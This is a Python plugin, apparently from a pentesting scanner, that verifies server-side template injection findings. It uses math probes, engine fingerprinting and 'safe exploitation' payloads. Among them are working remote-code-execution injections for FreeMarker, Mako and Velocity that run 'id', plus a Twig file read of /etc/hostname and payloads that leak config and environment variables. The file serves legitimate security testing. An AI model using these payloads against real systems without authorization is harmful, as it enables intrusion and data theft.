"""SSTI verification — second-pass confirmation of template injection findings."""

from __future__ import annotations

import logging
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Unique math probes — values unlikely to appear in normal HTML
VERIFY_PROBES = [
    # Jinja2 / Twig / Nunjucks (double-curly syntax)
    ("{{7*191}}", "1337", "jinja2/twig"),
    ("{{83+254}}", "337", "jinja2/twig"),
    ("{{7*191}}", "1337", "nunjucks"),
    ("{{83+254}}", "337", "nunjucks"),
    # FreeMarker / Velocity / Groovy (dollar-curly syntax)
    ("${7*191}", "1337", "freemarker/velocity"),
    ("${83+254}", "337", "freemarker/velocity"),
    ("${7*191}", "1337", "groovy"),
    ("${83+254}", "337", "groovy"),
    # ERB / EJS (erb tag syntax)
    ("<%= 7*191 %>", "1337", "erb/ejs"),
    ("<%= 83+254 %>", "337", "erb/ejs"),
    # Ruby ERB (hash-curly syntax)
    ("#{7*191}", "1337", "ruby_erb"),
    ("#{83+254}", "337", "ruby_erb"),
    # Pug (hash-curly syntax)
    ("#{7*191}", "1337", "pug"),
    ("#{83+254}", "337", "pug"),
    # Thymeleaf (double-bracket syntax)
    ("[[${7*191}]]", "1337", "thymeleaf"),
    ("[[${83+254}]]", "337", "thymeleaf"),
    # Blade (double-curly syntax — same as Jinja2)
    ("{{ 7*191 }}", "1337", "blade"),
    ("{{ 83+254 }}", "337", "blade"),
    # Liquid (double-curly with filter)
    ("{{ 7 | times: 191 }}", "1337", "liquid"),
    ("{{ 83 | plus: 254 }}", "337", "liquid"),
    # Slim / Haml (= expression syntax)
    ("= 7*191", "1337", "slim"),
    ("= 83+254", "337", "slim"),
    ("= 7*191", "1337", "haml"),
    ("= 83+254", "337", "haml"),
    # Mako (dollar-curly syntax)
    ("${7*191}", "1337", "mako"),
    ("${83+254}", "337", "mako"),
]

# Engine fingerprinting probes
ENGINE_FINGERPRINTS = [
    # Jinja2 vs Twig differentiation
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("{{7*'7'}}", "49", "twig"),
    # Flask / Jinja2 config leak
    ("{{config}}", "<Config", "flask/jinja2"),
    # Spring EL (SpEL)
    ("${T(java.lang.Math).PI}", "3.14159", "spring_el"),
    # FreeMarker version
    ("<#assign x=7*7>${x}", "49", "freemarker"),
    # Thymeleaf — runtime memory probe
    (
        "[[${T(java.lang.Runtime)"
        ".getRuntime().maxMemory()}]]",
        "Memory",
        "thymeleaf",
    ),
    # Velocity — class introspection
    (
        "$class.inspect("
        '"java.lang.Runtime")',
        "Runtime",
        "velocity",
    ),
    # Pebble — beans context
    ("{{ beans }}", "beans", "pebble"),
    # Nunjucks — range function
    ("{{ range(10) }}", "0,1,2,3", "nunjucks"),
    # Go template — context dump
    ("{{.}}", "{", "go"),
    # Dust — context dump
    ("{@contextDump/}", "context", "dust"),
    # Blade — PHP info
    ("@php phpinfo(); @endphp", "PHP Version", "blade"),
    # Liquid — string filter
    ('{{ "test" | upcase }}', "TEST", "liquid"),
    # Slim — ENV keys
    ("= ENV.keys", "PATH", "slim"),
    # Haml — ENV keys
    ("= ENV.keys", "PATH", "haml"),
]

# Safe exploitation probes (read-only info disclosure)
EXPLOIT_PROBES = {
    "jinja2": [
        (
            "{{config.items()}}",
            "config_leak",
            "Flask config disclosure",
        ),
        (
            "{{self.__class__.__mro__}}",
            "mro_leak",
            "MRO chain disclosure",
        ),
    ],
    "flask/jinja2": [
        (
            "{{config.items()}}",
            "config_leak",
            "Flask config disclosure",
        ),
        (
            "{{request.environ}}",
            "environ_leak",
            "WSGI environment disclosure",
        ),
    ],
    "spring_el": [
        (
            "${T(java.lang.System).getenv()}",
            "env_leak",
            "Environment variables",
        ),
        (
            "${T(java.lang.System).getProperty('os.name')}",
            "os_leak",
            "OS name disclosure",
        ),
    ],
    "freemarker": [
        (
            "${.version}",
            "version_leak",
            "Freemarker version disclosure",
        ),
        (
            "<#assign ex='freemarker.template.utility"
            ".ObjectConstructor'?new()>"
            "${ex('java.lang.ProcessBuilder','id')"
            ".start()}",
            "rce_check",
            "FreeMarker RCE via ObjectConstructor",
        ),
    ],
    "twig": [
        (
            "{{app.request.server.all|join(',')}}",
            "server_leak",
            "Twig server variables",
        ),
        (
            "{{'/etc/hostname'|file_excerpt(0,50)}}",
            "file_read",
            "Twig file read via file_excerpt",
        ),
    ],
    "mako": [
        (
            "${self.module.__file__}",
            "module_leak",
            "Mako module file path",
        ),
        (
            "<%import os%>${os.popen('id').read()}",
            "rce_check",
            "Mako RCE via os.popen",
        ),
    ],
    "velocity": [
        (
            "#set($rt=$class.inspect("
            "'java.lang.Runtime').type)"
            "#set($m=$rt.getMethod('getRuntime',null))"
            "$m.invoke(null,null).exec('id')",
            "rce_check",
            "Velocity RCE via Runtime.exec",
        ),
    ],
    "thymeleaf": [
        (
            "[[${T(java.lang.System)"
            ".getProperty('os.name')}]]",
            "os_leak",
            "Thymeleaf OS name disclosure",
        ),
    ],
    "pebble": [
        (
            '{{ beans.get("environment")'
            '.getProperty("os.name") }}',
            "os_leak",
            "Pebble OS name disclosure",
        ),
    ],
    "nunjucks": [
        (
            "{{range(10)|join(',')}}",
            "range_check",
            "Nunjucks range execution",
        ),
    ],
    "liquid": [
        (
            '{{ "test" | upcase }}',
            "filter_check",
            "Liquid filter execution",
        ),
    ],
}


class SstiVerifyPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssti_verify",
        display_name="SSTI Verification",
        category=PluginCategory.PENTESTING,
        description="Verifies SSTI findings with unique markers and engine fingerprinting",
        depends_on=["ssti_check"],
        produces=["ssti_verified"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        # Get original SSTI findings from pipeline state
        ssti_data = ctx.state.get("ssti_tests", [])
        if not ssti_data:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No SSTI findings to verify")],
                data={"verified": []},
            )

        findings: list[Finding] = []
        verified: list[dict] = []
        base_url = ""

        for scheme in ("https", "http"):
            try:
                async with ctx.rate:
                    await ctx.http.head(f"{scheme}://{target.host}/", timeout=5.0)
                    base_url = f"{scheme}://{target.host}"
                    break
            except Exception as e:
                logger.debug("ssti_verify: %s", e)
                continue

        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable for verification")],
                data={"verified": []},
            )

        for test in ssti_data:
            if ctx.should_stop:
                break
            if not test.get("confirmed"):
                continue

            page = test.get("page", "/")
            param = test.get("param", "q")
            engine = test.get("engine", "")

            # Step 1: Unique math verification (two independent probes)
            math_confirmed = 0
            for payload, expected, probe_engine in VERIFY_PROBES:
                if not self._engine_matches(engine, probe_engine):
                    continue
                url = f"{base_url}{page}?{param}={quote(payload)}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception as e:
                    logger.debug("ssti_verify: %s", e)
                    continue

                if expected in body:
                    # Check it's not just reflection
                    if payload in body and expected not in body.replace(payload, ""):
                        continue  # Payload reflected literally, not evaluated
                    math_confirmed += 1
                    if math_confirmed >= 2:
                        break

            # Step 2: WAF reflection filter
            waf_reflected = False
            test_payload = "{{7*191}}" if "jinja" in engine or "twig" in engine else "${7*191}"
            check_url = f"{base_url}{page}?{param}={quote(test_payload)}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(check_url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                    # If the raw payload string appears AND the computed value also appears,
                    # the value might just be coincidence in a reflection page
                    if test_payload in body and "1337" in body:
                        # Check if removing the payload still has "1337"
                        stripped = body.replace(test_payload, "")
                        if "1337" not in stripped:
                            waf_reflected = True
            except Exception as e:
                logger.debug("ssti_verify: %s", e)

            # Step 3: Engine fingerprinting
            detected_engine = ""
            for fp_payload, fp_expected, fp_engine in ENGINE_FINGERPRINTS:
                fp_url = f"{base_url}{page}?{param}={quote(fp_payload)}"
                try:
                    async with ctx.rate:
                        resp = await ctx.http.get(fp_url, timeout=8.0)
                        body = await resp.text(encoding="utf-8", errors="replace")
                except Exception as e:
                    logger.debug("ssti_verify: %s", e)
                    continue
                if fp_expected in body and fp_payload not in body:
                    detected_engine = fp_engine
                    break

            # Step 4: Safe exploitation probes
            exploit_results: list[str] = []
            probe_engine = detected_engine or engine
            for eng_key, probes in EXPLOIT_PROBES.items():
                if eng_key not in probe_engine.lower():
                    continue
                for ex_payload, _ex_label, ex_desc in probes:
                    ex_url = f"{base_url}{page}?{param}={quote(ex_payload)}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(ex_url, timeout=8.0)
                            body = await resp.text(encoding="utf-8", errors="replace")
                    except Exception as e:
                        logger.debug("ssti_verify: %s", e)
                        continue
                    if ex_payload not in body and len(body) > 50:
                        exploit_results.append(f"{ex_desc}: response {len(body)} bytes")

            # Classification
            entry = {
                "page": page,
                "param": param,
                "original_engine": engine,
                "detected_engine": detected_engine,
                "math_confirmed": math_confirmed,
                "waf_reflected": waf_reflected,
                "exploit_results": exploit_results,
            }

            if math_confirmed >= 2 and not waf_reflected:
                entry["verdict"] = "confirmed"
                eng_label = detected_engine or engine
                findings.append(Finding.critical(
                    f"SSTI VERIFIED: {eng_label} via ?{param}= on {page}",
                    description=(
                        f"Double-verified with unique math markers. "
                        f"Engine: {eng_label}. "
                        f"Exploitation probes: {len(exploit_results)} successful."
                    ),
                    evidence=(
                        f"Unique marker 7*191=1337 confirmed: yes\n"
                        f"Double verification: {math_confirmed} probes passed\n"
                        f"WAF reflection: {'yes (filtered)' if waf_reflected else 'no'}\n"
                        f"Engine: {detected_engine or 'unchanged from original'}\n"
                        f"Exploits: {'; '.join(exploit_results) or 'none succeeded'}"
                    ),
                    remediation=(
                        "CONFIRMED template injection — immediate remediation required. "
                        "Never pass user input into template expressions. "
                        "Use sandboxed environments with restricted builtins."
                    ),
                    tags=["pentesting", "ssti", "verified"],
                ))
            elif math_confirmed >= 1 and not waf_reflected:
                entry["verdict"] = "likely"
                findings.append(Finding.high(
                    f"SSTI likely: {engine} via ?{param}= on {page}",
                    description=(
                        "Single math marker confirmed. "
                        "Needs manual verification."
                    ),
                    evidence=f"Math probes passed: {math_confirmed}/2",
                    tags=["pentesting", "ssti", "likely"],
                ))
            else:
                entry["verdict"] = "false_positive"
                findings.append(Finding.info(
                    f"SSTI false positive: {engine} via ?{param}= on {page} [WAF-FP]",
                    description=(
                        f"Original SSTI finding not confirmed on re-test. "
                        f"Math confirmed: {math_confirmed}, WAF reflection: {waf_reflected}."
                    ),
                    tags=["pentesting", "ssti", "false-positive"],
                ))

            verified.append(entry)

        if not verified:
            findings.append(Finding.info(
                "No confirmed SSTI findings to verify",
                tags=["pentesting", "ssti"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"verified": verified},
        )

    @staticmethod
    def _engine_matches(original: str, probe: str) -> bool:
        """Check if probe engine type is compatible with original detection."""
        original = original.lower()
        probe = probe.lower()
        # Map engine families
        families = {
            "jinja2": ("jinja2", "twig", "jinja2/twig", "nunjucks"),
            "twig": ("jinja2", "twig", "jinja2/twig"),
            "jinja2/twig": ("jinja2", "twig", "jinja2/twig", "nunjucks"),
            "jinja2_confirm": ("jinja2", "twig", "jinja2/twig"),
            "nunjucks": ("jinja2", "twig", "jinja2/twig", "nunjucks"),
            "freemarker": (
                "freemarker", "velocity", "freemarker/velocity",
            ),
            "velocity": (
                "freemarker", "velocity", "freemarker/velocity",
            ),
            "freemarker/velocity": (
                "freemarker", "velocity", "freemarker/velocity",
            ),
            "groovy": (
                "freemarker", "velocity", "freemarker/velocity",
                "groovy",
            ),
            "mako": (
                "freemarker", "velocity", "freemarker/velocity",
                "mako",
            ),
            "thymeleaf": ("thymeleaf", "spring_el"),
            "pebble": ("pebble",),
            "erb": ("erb", "ejs", "erb/ejs"),
            "ejs": ("erb", "ejs", "erb/ejs"),
            "erb/ejs": ("erb", "ejs", "erb/ejs"),
            "ruby_erb": ("ruby_erb",),
            "pug": ("pug", "ruby_erb"),
            "slim": ("slim", "haml"),
            "haml": ("slim", "haml"),
            "blade": ("blade", "jinja2/twig"),
            "liquid": ("liquid",),
            "go": ("go",),
            "dust": ("dust",),
            "spring_el": (
                "freemarker", "velocity",
                "freemarker/velocity", "spring_el",
            ),
        }
        family = families.get(original, (original,))
        return any(p in probe for p in family) or probe in family
